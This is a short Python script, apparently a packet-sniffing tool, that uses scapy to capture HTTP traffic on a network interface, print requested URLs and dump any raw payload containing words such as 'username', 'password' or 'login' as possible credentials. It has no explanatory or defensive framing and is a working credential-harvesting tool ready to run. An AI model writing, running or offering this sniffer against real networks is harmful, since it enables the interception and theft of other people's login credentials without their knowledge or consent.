import scapy.all as scapy
from scapy.layers import http
KEYWORDS= ('username' , 'password', 'signup' , 'login' , 'uname' , 'user','pass','name')
def sniff(interface):
    scapy.sniff(iface=interface , store = False , prn = process_packet)
def get_url(packet):
    try:
        return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')
    except (UnicodeDecodeError, AttributeError):
        return "Invalid URL data"


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP URL is:{}".format(url) )
    cred = get_credentials(packet)
    if cred:
        print("Print Possible credential information{}".format(cred))
    print("new packet")

def get_credentials(packet):
    try:
        if packet.haslayer(scapy.Raw):
            field_load = packet[scapy.Raw].load.decode('utf-8')
            for keyword in KEYWORDS:
               if keyword in field_load:
                    return field_load
    except UnicodeDecodeError:
        pass

sniff("Ethernet")